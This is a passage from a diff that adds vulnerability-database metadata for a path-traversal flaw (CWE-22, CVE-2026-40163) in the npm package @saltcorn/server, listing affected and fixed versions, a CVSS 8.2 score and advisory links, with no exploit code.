+      - pkg:npm/%40saltcorn/server@1.1.1-beta.5
+      - pkg:npm/%40saltcorn/server@1.1.1-beta.6
+      - pkg:npm/%40saltcorn/server@1.1.1-beta.7
+      - pkg:npm/%40saltcorn/server@1.1.1-beta.8
+      - pkg:npm/%40saltcorn/server@1.1.1-rc.1
+      - pkg:npm/%40saltcorn/server@1.1.1-rc.2
+      - pkg:npm/%40saltcorn/server@1.1.1-rc.3
+      - pkg:npm/%40saltcorn/server@1.1.1-rc.4
+      - pkg:npm/%40saltcorn/server@1.1.1
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.0
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.1
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.2
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.3
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.4
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.5
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.6
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.7
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.8
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.9
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.10
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.11
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.12
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.13
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.14
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.15
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.16
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.17
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.18
+      - pkg:npm/%40saltcorn/server@1.1.2-beta.19
+      - pkg:npm/%40saltcorn/server@1.1.2
+      - pkg:npm/%40saltcorn/server@1.1.3-beta.0
+      - pkg:npm/%40saltcorn/server@1.1.3-beta.1
+      - pkg:npm/%40saltcorn/server@1.1.3-beta.2
+      - pkg:npm/%40saltcorn/server@1.1.3-beta.3
+      - pkg:npm/%40saltcorn/server@1.1.3-beta.4
+      - pkg:npm/%40saltcorn/server@1.1.3-beta.5
+      - pkg:npm/%40saltcorn/server@1.1.3-beta.6
+      - pkg:npm/%40saltcorn/server@1.1.3-beta.7
+      - pkg:npm/%40saltcorn/server@1.1.3-beta.8
+      - pkg:npm/%40saltcorn/server@1.1.3-beta.9
+      - pkg:npm/%40saltcorn/server@1.1.3-beta.10
+      - pkg:npm/%40saltcorn/server@1.1.3-rc.0
+      - pkg:npm/%40saltcorn/server@1.1.3
+      - pkg:npm/%40saltcorn/server@1.1.4-alpha.0
+      - pkg:npm/%40saltcorn/server@1.1.4-alpha.1
+      - pkg:npm/%40saltcorn/server@1.1.4-alpha.2
+      - pkg:npm/%40saltcorn/server@1.1.4-alpha.3
+      - pkg:npm/%40saltcorn/server@1.1.4-beta.0
+      - pkg:npm/%40saltcorn/server@1.1.4-beta.1
+      - pkg:npm/%40saltcorn/server@1.1.4-beta.2
+      - pkg:npm/%40saltcorn/server@1.1.4-beta.3
+      - pkg:npm/%40saltcorn/server@1.1.4-beta.5
+      - pkg:npm/%40saltcorn/server@1.1.4-beta.6
+      - pkg:npm/%40saltcorn/server@1.1.4-beta.7
+      - pkg:npm/%40saltcorn/server@1.1.4-beta.8
+      - pkg:npm/%40saltcorn/server@1.1.4-beta.9
+      - pkg:npm/%40saltcorn/server@1.1.4-beta.10
+      - pkg:npm/%40saltcorn/server@1.1.4-beta.11
+      - pkg:npm/%40saltcorn/server@1.1.4
+      - pkg:npm/%40saltcorn/server@1.2.0-beta.0
+      - pkg:npm/%40saltcorn/server@1.2.0-beta.1
+      - pkg:npm/%40saltcorn/server@1.2.0-beta.2
+      - pkg:npm/%40saltcorn/server@1.2.0-beta.3
+      - pkg:npm/%40saltcorn/server@1.2.0-beta.4
+      - pkg:npm/%40saltcorn/server@1.2.0-beta.5
+      - pkg:npm/%40saltcorn/server@1.2.0-beta.6
+      - pkg:npm/%40saltcorn/server@1.2.0-beta.7
+      - pkg:npm/%40saltcorn/server@1.2.0-rc.0
+      - pkg:npm/%40saltcorn/server@1.2.0-rc.1
+      - pkg:npm/%40saltcorn/server@1.2.0-rc.2
+      - pkg:npm/%40saltcorn/server@1.2.0
+      - pkg:npm/%40saltcorn/server@1.3.0-beta.0
+      - pkg:npm/%40saltcorn/server@1.3.0-beta.1
+      - pkg:npm/%40saltcorn/server@1.3.0-beta.2
+      - pkg:npm/%40saltcorn/server@1.3.0-beta.3
+      - pkg:npm/%40saltcorn/server@1.3.0-beta.4
+      - pkg:npm/%40saltcorn/server@1.3.0-beta.5
+      - pkg:npm/%40saltcorn/server@1.3.0-beta.6
+      - pkg:npm/%40saltcorn/server@1.3.0-beta.7
+      - pkg:npm/%40saltcorn/server@1.3.0-beta.8
+      - pkg:npm/%40saltcorn/server@1.3.0-beta.9
+      - pkg:npm/%40saltcorn/server@1.3.0-beta.10
+      - pkg:npm/%40saltcorn/server@1.3.0-beta.11
+      - pkg:npm/%40saltcorn/server@1.3.0-beta.12
+      - pkg:npm/%40saltcorn/server@1.3.0-beta.13
+      - pkg:npm/%40saltcorn/server@1.3.0-beta.14
+      - pkg:npm/%40saltcorn/server@1.3.0-beta.15
+      - pkg:npm/%40saltcorn/server@1.3.0
+      - pkg:npm/%40saltcorn/server@1.3.1-beta.0
+      - pkg:npm/%40saltcorn/server@1.3.1-beta.1
+      - pkg:npm/%40saltcorn/server@1.3.1-beta.2
+      - pkg:npm/%40saltcorn/server@1.3.1-beta.3
+      - pkg:npm/%40saltcorn/server@1.3.1-beta.4
+      - pkg:npm/%40saltcorn/server@1.3.1-beta.6
+      - pkg:npm/%40saltcorn/server@1.3.1-beta.7
+      - pkg:npm/%40saltcorn/server@1.3.1-beta.8
+      - pkg:npm/%40saltcorn/server@1.3.1-beta.9
+      - pkg:npm/%40saltcorn/server@1.3.1-beta.10
+      - pkg:npm/%40saltcorn/server@1.3.1-beta.11
+      - pkg:npm/%40saltcorn/server@1.3.1-beta.12
+      - pkg:npm/%40saltcorn/server@1.3.1
+      - pkg:npm/%40saltcorn/server@1.4.0-beta.0
+      - pkg:npm/%40saltcorn/server@1.4.0-beta.1
+      - pkg:npm/%40saltcorn/server@1.4.0-beta.2
+      - pkg:npm/%40saltcorn/server@1.4.0-beta.3
+      - pkg:npm/%40saltcorn/server@1.4.0-beta.4
+      - pkg:npm/%40saltcorn/server@1.4.0-beta.5
+      - pkg:npm/%40saltcorn/server@1.4.0-beta.6
+      - pkg:npm/%40saltcorn/server@1.4.0-beta.7
+      - pkg:npm/%40saltcorn/server@1.4.0-beta.8
+      - pkg:npm/%40saltcorn/server@1.4.0-beta.9
+      - pkg:npm/%40saltcorn/server@1.4.0-beta.10
+      - pkg:npm/%40saltcorn/server@1.4.0-beta.11
+      - pkg:npm/%40saltcorn/server@1.4.0-beta.12
+      - pkg:npm/%40saltcorn/server@1.4.0-beta.13
+      - pkg:npm/%40saltcorn/server@1.4.0-rc.1
+      - pkg:npm/%40saltcorn/server@1.4.0-rc.2
+      - pkg:npm/%40saltcorn/server@1.4.0-rc.3
+      - pkg:npm/%40saltcorn/server@1.4.0-rc.4
+      - pkg:npm/%40saltcorn/server@1.4.0
+      - pkg:npm/%40saltcorn/server@1.4.1-beta.0
+      - pkg:npm/%40saltcorn/server@1.4.1-beta.1
+      - pkg:npm/%40saltcorn/server@1.4.1-beta.2
+      - pkg:npm/%40saltcorn/server@1.4.1-beta.3
+      - pkg:npm/%40saltcorn/server@1.4.1
+      - pkg:npm/%40saltcorn/server@1.4.2
+      - pkg:npm/%40saltcorn/server@1.4.3
+      - pkg:npm/%40saltcorn/server@1.4.4
+    fixed_packages:
+      - pkg:npm/%40saltcorn/server@1.4.5
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/%40saltcorn/server
+    affected_versions: vers:npm/>=1.5.0-beta.0|<1.5.5
+    fixed_versions: vers:npm/1.5.5
+    affected_packages:
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.0
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.1
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.2
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.3
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.4
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.5
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.6
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.7
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.8
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.9
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.10
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.11
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.12
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.13
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.14
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.15
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.16
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.17
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.18
+      - pkg:npm/%40saltcorn/server@1.5.0-beta.19
+      - pkg:npm/%40saltcorn/server@1.5.0-rc.1
+      - pkg:npm/%40saltcorn/server@1.5.0-rc.2
+      - pkg:npm/%40saltcorn/server@1.5.0
+      - pkg:npm/%40saltcorn/server@1.5.2
+      - pkg:npm/%40saltcorn/server@1.5.3
+      - pkg:npm/%40saltcorn/server@1.5.4
+      - pkg:npm/%40saltcorn/server@1.5.5-beta.0
+    fixed_packages:
+      - pkg:npm/%40saltcorn/server@1.5.5
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/%40saltcorn/server
+    affected_versions: vers:npm/>=1.6.0-alpha.0|<1.6.0-beta.4
+    fixed_versions: vers:npm/1.6.0-beta.4
+    affected_packages:
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.0
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.1
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.2
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.3
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.4
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.5
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.6
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.7
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.8
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.9
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.10
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.11
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.12
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.13
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.14
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.15
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.16
+      - pkg:npm/%40saltcorn/server@1.6.0-alpha.17
+      - pkg:npm/%40saltcorn/server@1.6.0-beta.1
+      - pkg:npm/%40saltcorn/server@1.6.0-beta.2
+      - pkg:npm/%40saltcorn/server@1.6.0-beta.3
+    fixed_packages:
+      - pkg:npm/%40saltcorn/server@1.6.0-beta.4
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-32pv-mpqg-h292/GHSA-32pv-mpqg-h292.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-22
+references:
+  - url: https://github.com/saltcorn/saltcorn
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-40163
+    reference_type:
+    reference_id: CVE-2026-40163
+  - url: https://github.com/saltcorn/saltcorn/security/advisories/GHSA-32pv-mpqg-h292
+    reference_type:
+    reference_id: GHSA-32pv-mpqg-h292
+exploits: []
